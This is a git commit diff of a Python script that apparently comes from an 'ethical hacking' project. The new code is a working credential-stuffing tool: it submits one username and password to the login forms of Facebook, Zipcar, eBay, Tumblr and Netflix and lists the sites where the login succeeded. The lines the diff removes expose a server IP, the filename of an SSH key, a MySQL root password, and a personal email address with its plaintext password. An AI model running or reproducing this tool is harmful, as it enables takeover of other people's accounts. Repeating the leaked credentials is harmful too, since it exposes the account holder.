2aa0e99494b85968c95c8d6406d64ebdd500f803
root <root@localhost.localdomain>
2017-11-21 21:42:27 -0600

    url try complete

--- try.py
+++ try.py
@@ -1,7 +1,9 @@
+#sample input line
+#python try.py usename password
+
 import mechanize
-import MySQLdb
-import paramiko
-from sshtunnel import SSHTunnelForwarder
+import sys
+
 browser = mechanize.Browser()
 browser.set_handle_robots(False)
 cookies = mechanize.CookieJar()
@@ -9,117 +11,73 @@ browser.set_cookiejar(cookies)
 browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 browser.set_handle_refresh(False)
 
-#NOTE: you must have the ssh key in the same directory as try.py
+def main():
 
-#ssh tunneling = https://stackoverflow.com/questions/44128175/python-used-sshtunnel-cant-connect-to-mysql
+    try_url = ["http://www.facebook.com/login.php",
+                "https://members.zipcar.com/register/",
+                "https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ru=https%3A%2F%2Fwww.ebay.com%2F",
+                "https://www.tumblr.com/login",
+                "https://www.netflix.com/login"
+                ]
 
+    correct_url = ["https://www.facebook.com/",
+                    "https://members.zipcar.com/members/account",
+                    "https://www.ebay.com/",
+                    "https://www.tumblr.com/dashboard",
+                    "https://www.netflix.com/browse"]
 
-#-----------------------------------------------
-#SSHTUNNEL
-with SSHTunnelForwarder(
-    ("13.57.61.57", 22), #<--- iffy
-    # ('localhost', 22),
-    ssh_username = "ubuntu",
-    ssh_pkey = "ethicalhacking2.pem",
-    remote_bind_address = ('127.0.0.1', 3306) #<--- iffy
-    # remote_bind_address = ('13.57.61.57', 3306)
-) as tunnel:
-        connection = MySQLdb.connect(user = "root",
-        password = "ethicalhacking")
+    # fb #need to use nr = 0 (email, pass)
 
+    # zipcar #need to use nr = 0 (user_name, password)
 
-# db = MySQLdb.connect (host = "13.57.61.57",
-#                          user = "root",
-#                         passwd = "ethicalhacking",
-#                         db = "ethicalhackingteam2")
-#
-# cur = db.cursor()
-# cur.execute("SELECT * FROM ethicalhackingteam2")
-# for r in cur.fetchall():
-#     print r[0], " ", r[1]
+    # ebay #need to use nr = 0 (userid, pass)
 
-#--------------------------------------------
-# #PARAMIKO - feel free to try it
-# k = paramiko.RSAKey.from_private_key_file("ethicalhacking2.pem")
-# c = paramiko.SSHClient()
-# c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-# print("connecting")
-# c.connect(hostname = "13.57.61.57", username = "ubuntu", pkey = k)
-# print("connected")
-# print(c.get_transport().is_active())
-#
-#
-# # commands = ["ls", "cd /var/www/html"]
-# commands = ["mysql --user=root --password=ethicalhacking" , "use ethicalhackingteam2", "select * from ethicalhackingteam2  "]
-#
-# for com in commands:
-#     print "Executing {}".format(com)
-#     print(c.get_transport().is_active())
-#
-#     stdin, stdout, stderr = c.exec_command(com)
-#     stdin.write("use ethicalhackingteam2")
-#     print stdout.read()
-#     print("errors")
-#     print stderr.read()
-#--------------------------------------------------
+    # tumblr #need to use nr = 0 (user[email], user[password])
 
-#LIST OF SUCCESSFUL URLS
+    # netflix #need to use nr = 0 (email, password)
 
+    url_arg = sys.argv[1]
+    username = sys.argv[2]
+    password = sys.argv[3]
 
+    response_url_collection = list()
+    for i in try_url:
+        browser.open(i)
+        browser.select_form(nr = 0)       #This is login-password form -> nr = number = 0
+        if "facebook" in i:
+            browser.form['email'] = username
+            browser.form['pass'] = password
+            response = browser.submit()
+        if "zipcar" in i:
+            browser.form['user_name'] = username
+            browser.form['password'] = password
+            response = browser.submit()
+        if "ebay" in i:
+            browser.form['userid'] = username
+            browser.form['pass'] = password
+            response = browser.submit()
+        if "tumblr" in i :
+            browser.form['user[email]'] = username
+            browser.form['user[password]'] = password
+            response = browser.submit()
+        if "netflix" in i:
+            browser.form['email'] = username
+            browser.form['password'] = password
+            response = browser.submit()
 
+        response_url = response.geturl()
+        response_url_collection.append(response_url)
+    print ("resulting urls ", response_url_collection)
 
+#compare the urls
+    match_success_urls = list()
+    for j in response_url_collection:
+        for h in correct_url:
+            if j == h:
+                match_success_urls.append(j)
 
+    print ("sites we were able to access : " , match_success_urls)
 
-
-
-
-
-
-
-
-
-
-class yes:
-
-    def __init__(self):
-        self.browser = mechanize.Browser()
-        self.browser.set_handle_robots(False)
-
-    def main(self):
-        # url = 'http://www.facebook.com/login.php' #need to use nr = 0 (email, pass)
-
-        # url = 'https://www.instructables.com/account/login/' #need to use nr = 1 (u, p)
-
-        # url = 'https://members.zipcar.com/register/' #need to use nr = 0 (user_name, password)
-
-        # url = 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ru=https%3A%2F%2Fwww.ebay.com%2F' #need to use nr = 0 (userid, pass)
-
-        # url = 'https://www.tumblr.com/login' #need to use nr = 0 (user[email], user[password])
-
-        # url = 'https://www.netflix.com/login' #need to use nr = 0 (email, password)
-
-
-
-
-        yes = self.browser.open(url)
-        # i = 0
-        # for f in self.browser.forms():
-        #     print(i)
-        #     print(f)
-        #
-        #     ++i
-
-
-
-
-        self.browser.select_form(nr = 0)       #This is login-password form -> nr = number = 0
-        self.browser.form["email"] = "alexbui3415@yahoo.com"
-        self.browser.form['password'] = "Thongthao123"
-        response = self.browser.submit()
-        print (response.geturl())
-
-        #lets compare urls
-        #IF RESPONSE != LIST OF URL, THEN IT'S A FAIL
 
 
 if __name__ == '__main__':
